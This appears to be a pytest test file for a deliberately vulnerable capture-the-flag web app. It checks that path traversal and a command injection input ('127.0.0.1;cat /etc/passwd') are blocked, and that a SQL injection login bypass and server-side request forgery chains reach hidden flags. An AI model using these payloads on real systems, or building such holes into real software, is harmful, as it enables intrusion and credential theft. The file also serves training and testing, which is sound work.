import http.client
import importlib.util
import pathlib
import re
import sqlite3
import threading
import urllib.error
import urllib.parse
import urllib.request
from typing import Any, cast

import pytest


APP_PATH = pathlib.Path(__file__).resolve().parents[1] / "app.py"


def load_app_module():
    spec = importlib.util.spec_from_file_location("ctf_stage1_app", APP_PATH)
    assert spec is not None
    assert spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return cast(Any, module)


@pytest.fixture
def app_module(tmp_path):
    module = load_app_module()
    module.DB_PATH = str(tmp_path / "data" / "users.db")
    module.STATIC_DIR = str(tmp_path / "static")
    module.REPORTS_DIR = str(tmp_path / "reports")
    module.FLAG_2 = "FLAG{stage1_db_flag}"
    module.FLAG_3 = "FLAG{stage1_ssrf_flag}"
    module.FLAG_4 = "FLAG{stage1_credential_flag}"
    module.FLAG_3_PATH = str(tmp_path / "flag3.txt")
    module.FLAG_4_PATH = str(tmp_path / "flag4.txt")
    module.authenticated_sessions.clear()
    module.init_db()
    module.ensure_static_files()
    module.ensure_report_templates()
    pathlib.Path(module.FLAG_3_PATH).write_text(f"{module.FLAG_3}\n", encoding="utf-8")
    pathlib.Path(module.FLAG_4_PATH).write_text(f"{module.FLAG_4}\n", encoding="utf-8")
    return module


@pytest.fixture
def running_server(app_module):
    server = app_module.ThreadingHTTPServer(("127.0.0.1", 0), app_module.CTFHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        yield app_module, f"http://127.0.0.1:{server.server_port}"
    finally:
        server.shutdown()
        thread.join(timeout=5)
        server.server_close()


def test_downloads_block_path_traversal(running_server):
    _, base_url = running_server
    with pytest.raises(urllib.error.HTTPError) as exc_info:
        urllib.request.urlopen(f"{base_url}/downloads/file?name=../../data/users.db")
    assert exc_info.value.code == 404


def test_tools_ping_blocks_command_injection(running_server):
    _, base_url = running_server
    payload = urllib.parse.quote("127.0.0.1;cat /etc/passwd", safe="")
    with pytest.raises(urllib.error.HTTPError) as exc_info:
        urllib.request.urlopen(f"{base_url}/tools/ping?host={payload}")
    assert exc_info.value.code == 400


def test_sqli_reaches_database_flag_via_admin_panel(running_server):
    app_module, base_url = running_server
    data = urllib.parse.urlencode(
        {"username": "admin' OR '1'='1' -- ", "password": "irrelevant"}
    ).encode()
    response = urllib.request.urlopen(
        urllib.request.Request(f"{base_url}/login", data=data, method="POST")
    )
    session_cookie = response.headers["Set-Cookie"].split(";", 1)[0]

    admin_panel = urllib.request.urlopen(
        urllib.request.Request(f"{base_url}/admin-panel", headers={"Cookie": session_cookie})
    )
    body = admin_panel.read().decode()
    assert app_module.FLAG_2 in body


def test_internal_preview_requires_ssrf(running_server):
    _, base_url = running_server
    with pytest.raises(urllib.error.HTTPError) as exc_info:
        urllib.request.urlopen(f"{base_url}/api/internal/preview?resource=weekly-ops")
    assert exc_info.value.code == 403


def test_static_backup_blocks_path_traversal(running_server):
    _, base_url = running_server
    parsed = urllib.parse.urlparse(base_url)
    conn = http.client.HTTPConnection(parsed.hostname, parsed.port)
    conn.request("GET", "/static/backup/../../data/users.db")
    response = conn.getresponse()
    body = response.read().decode()
    conn.close()

    assert response.status == 404
    assert "404" in body


def test_ssrf_preview_reaches_internal_flag(running_server):
    app_module, base_url = running_server
    internal_url = urllib.parse.quote(
        f"{base_url}/api/internal/preview?resource=weekly-ops", safe=""
    )
    response = urllib.request.urlopen(f"{base_url}/preview/fetch?url={internal_url}")
    body = response.read().decode()
    assert app_module.FLAG_3 in body


def test_internal_preview_reads_current_flag3_file(running_server):
    app_module, base_url = running_server
    pathlib.Path(app_module.FLAG_3_PATH).write_text("FLAG{rotated_ssrf_flag}\n", encoding="utf-8")

    internal_url = urllib.parse.quote(
        f"{base_url}/api/internal/preview?resource=weekly-ops", safe=""
    )
    response = urllib.request.urlopen(f"{base_url}/preview/fetch?url={internal_url}")
    body = response.read().decode()

    assert "FLAG{rotated_ssrf_flag}" in body


def test_internal_maintenance_sync_requires_ssrf(running_server):
    _, base_url = running_server
    with pytest.raises(urllib.error.HTTPError) as exc_info:
        urllib.request.urlopen(f"{base_url}/api/internal/maintenance/sync-credentials")
    assert exc_info.value.code == 403


def test_ssrf_can_queue_flag4_sync_request(running_server):
    app_module, base_url = running_server
    internal_url = urllib.parse.quote(
        f"{base_url}/api/internal/maintenance/sync-credentials", safe=""
    )
    response = urllib.request.urlopen(f"{base_url}/preview/fetch?url={internal_url}")
    body = response.read().decode()

    match = re.search(r"credential_snapshot_[A-Za-z0-9_]+\.txt", body)
    assert match is not None

    request_files = sorted(pathlib.Path(app_module.REPORTS_DIR, ".maintenance-queue").glob("credential_sync_*.req"))
    assert len(request_files) == 1
    assert request_files[0].read_text(encoding="utf-8").strip() == match.group(0)


def test_flag4_export_requires_worker_output(running_server):
    _, base_url = running_server
    internal_url = urllib.parse.quote(
        f"{base_url}/api/internal/maintenance/sync-credentials", safe=""
    )
    response = urllib.request.urlopen(f"{base_url}/preview/fetch?url={internal_url}")
    body = response.read().decode()
    export_name = re.search(r"credential_snapshot_[A-Za-z0-9_]+\.txt", body)
    assert export_name is not None

    request = urllib.request.Request(
        f"{base_url}/api/export/report?file={urllib.parse.quote(export_name.group(0), safe='')}",
        headers={"X-Internal-Request": "1"},
    )
    with pytest.raises(urllib.error.HTTPError) as exc_info:
        urllib.request.urlopen(request)
    assert exc_info.value.code == 404


def test_flag4_chain_reads_synced_snapshot_after_queue_processing(running_server):
    app_module, base_url = running_server
    internal_url = urllib.parse.quote(
        f"{base_url}/api/internal/maintenance/sync-credentials", safe=""
    )
    response = urllib.request.urlopen(f"{base_url}/preview/fetch?url={internal_url}")
    body = response.read().decode()
    export_name = re.search(r"credential_snapshot_[A-Za-z0-9_]+\.txt", body)
    assert export_name is not None

    export_path = pathlib.Path(app_module.REPORTS_DIR, export_name.group(0))
    export_path.write_text(f"{app_module.FLAG_4}\n", encoding="utf-8")

    request = urllib.request.Request(
        f"{base_url}/api/export/report?file={urllib.parse.quote(export_name.group(0), safe='')}",
        headers={"X-Internal-Request": "1"},
    )
    exported = urllib.request.urlopen(request)
    exported_body = exported.read().decode()

    assert app_module.FLAG_4 in exported_body


def test_restart_preserves_runtime_database_flag(app_module):
    runtime_flag = "FLAG{runtime_db_flag}"
    conn = sqlite3.connect(app_module.DB_PATH)
    conn.execute("UPDATE secrets SET value=? WHERE name='database_flag'", (runtime_flag,))
    conn.commit()
    conn.close()

    app_module.init_db()

    conn = sqlite3.connect(app_module.DB_PATH)
    row = conn.execute("SELECT value FROM secrets WHERE name='database_flag'").fetchone()
    conn.close()

    assert row is not None
    assert row[0] == runtime_flag
